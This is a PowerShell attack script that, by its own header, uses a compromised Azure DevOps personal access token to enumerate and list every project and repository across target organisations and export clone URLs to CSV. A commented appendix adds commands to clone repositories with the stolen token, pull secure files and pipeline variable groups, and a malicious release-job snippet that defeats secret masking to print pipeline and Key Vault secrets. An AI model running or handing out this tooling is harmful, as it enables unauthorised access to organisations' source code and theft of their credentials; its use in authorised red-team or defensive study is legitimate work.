#
# Script to to dump all projs/repos for a known org list from Azure DevOps via REST API and a compromised PAT
#

# Setting up our auth headers to include the PAT and a dummy username
$MyPat = ''
$B64Pat = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("git:$MyPat"))
$headers = @{Authorization=("Basic {0}" -f $B64Pat)}

# Array of known org strings to recon
$orgs = @(
"",
"",
""
)
$results = @()

# Output file
$file = $env:userprofile + "\Desktop\azuredevops_repos_" + $MyPat.Substring(0,5) + ".csv"

# Loop through all orgs and list projects
foreach ($org in $orgs) {
	$uri = "https://" + $org + ".visualstudio.com/_apis/projects?api-version=6.0&`$top=500"
	try {
		$projresponse = Invoke-RestMethod -Method "GET" -Uri $uri -Headers $headers -ErrorAction Stop
	} catch {
		$result = New-Object -Typename PSObject
		Add-Member -InputObject $result -MemberType NoteProperty -Name "Org" -Value $org
		Add-Member -InputObject $result -MemberType NoteProperty -Name "Proj" -Value "Access Denied"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "ProjLastUpdate" -Value "N/A"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "Repo" -Value "N/A"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "RepoSize" -Value "N/A"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "GitCloneUrl" -Value "N/A"
		$results += $result
		continue
	}

	if ($projresponse.count -eq 0) {
		$result = New-Object -Typename PSObject
		Add-Member -InputObject $result -MemberType NoteProperty -Name "Org" -Value $org
		Add-Member -InputObject $result -MemberType NoteProperty -Name "Proj" -Value "No Projects Found"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "ProjLastUpdate" -Value "N/A"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "Repo" -Value "N/A"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "RepoSize" -Value "N/A"
		Add-Member -InputObject $result -MemberType NoteProperty -Name "GitCloneUrl" -Value "N/A"
		$results += $result
		continue
	}
	
	# Loop through all projects for org and list repos
	foreach ($proj in ($projresponse.value | select name,lastupdatetime)) {
		$uri = "https://" + $org + ".visualstudio.com/" + $proj.name + "/_apis/git/repositories?api-version=6.0&`$top=500"
		try {
			$reporesponse = Invoke-RestMethod -Method "GET" -Uri $uri -Headers $headers -ErrorAction Stop
		} catch {
			$result = New-Object -Typename PSObject
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Org" -Value $org
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Proj" -Value $proj.name
			Add-Member -InputObject $result -MemberType NoteProperty -Name "ProjLastUpdate" -Value $proj.lastupdatetime
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Repo" -Value "Access Denied"
			Add-Member -InputObject $result -MemberType NoteProperty -Name "RepoSize" -Value "N/A"
			Add-Member -InputObject $result -MemberType NoteProperty -Name "GitCloneUrl" -Value "N/A"
			$results += $result
			continue
		}
		
		if ($reporesponse.count -eq 0) {
			$result = New-Object -Typename PSObject
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Org" -Value $org
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Proj" -Value $proj.name
			Add-Member -InputObject $result -MemberType NoteProperty -Name "ProjLastUpdate" -Value $proj.lastupdatetime
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Repo" -Value "No Repos Found"
			Add-Member -InputObject $result -MemberType NoteProperty -Name "RepoSize" -Value "N/A"
			Add-Member -InputObject $result -MemberType NoteProperty -Name "GitCloneUrl" -Value "N/A"
			$results += $result
			continue
		}
		
		# Loop through all repos for project
		foreach ($repo in $reporesponse.value) {
			$git = "https://" + $org + ".visualstudio.com/" + $proj.name + "/_git/" + $repo.name
			$result = New-Object -Typename PSObject
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Org" -Value $org
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Proj" -Value $proj.name
			Add-Member -InputObject $result -MemberType NoteProperty -Name "ProjLastUpdate" -Value $proj.lastupdatetime
			Add-Member -InputObject $result -MemberType NoteProperty -Name "Repo" -Value $repo.name
			Add-Member -InputObject $result -MemberType NoteProperty -Name "RepoSize" -Value $repo.size
			Add-Member -InputObject $result -MemberType NoteProperty -Name "GitCloneUrl" -Value $git
			$results += $result
		}
	}
}

# Export results to CSV
$results | Export-CSV -NoTypeInformation -Encoding UTF8 -Path $file




# Other recon paths

<#

# Using PAT to git clone a repo
git -c http.extraHeader="Authorization: Basic $B64Pat" clone https://<orgName>.visualstudio.com/<projName>/_git/<repoName>

# Getting variables and variable groups from a pipeline release definition
$response = Invoke-RestMethod -Method "GET" -Uri "https://<orgName>.visualstudio.com/<projName>/_apis/distributedtask/securefiles?api-version=6.0&`$top=500" -Headers $headers 

# Getting variables and variable groups from a pipeline release definition
$response = Invoke-RestMethod -Method "GET" -Uri "https://<orgName>.visualstudio.com/<projName>/_apis/release/definitions/{definitionId}?propertyFilters={variables,variableGroups}&api-version=6.0-preview&`$top=500" -Headers $headers 

# Getting variable groups
$response = Invoke-RestMethod -Method "GET" -Uri "https://<orgName>.visualstudio.com/<projName>/_apis/distributedtask/variablegroups?api-version=6.0&`$top=500" -Headers $headers 

# Getting variables for a given variable group
$response = Invoke-RestMethod -Method "GET" -Uri "https://<orgName>.visualstudio.com/<projName>/_apis/distributedtask/variablegroups/{groupId}?api-version=6.0&`$top=500" -Headers $headers 

# If Azure Key Vault is being used (likely via a task, service connection, direct variable mapping, etc using SPN creds) then the net result is generally the same, the secrets are mapped as variables accessible at runtime
# This is where a malicious pipeline release job is needed
# This technique will bypass secret variable masking and can be used to extract both secret variables and secrets fetched at runtime from the Azure Key Vault


$secret = $env:secret
Write-Host "plain_text_variable: $($env:plain_text_variable)"
Write-Host "secret_variable: $($secret)"
Write-Host "vertical secret_variable:"
$secret.ToCharArray()

#>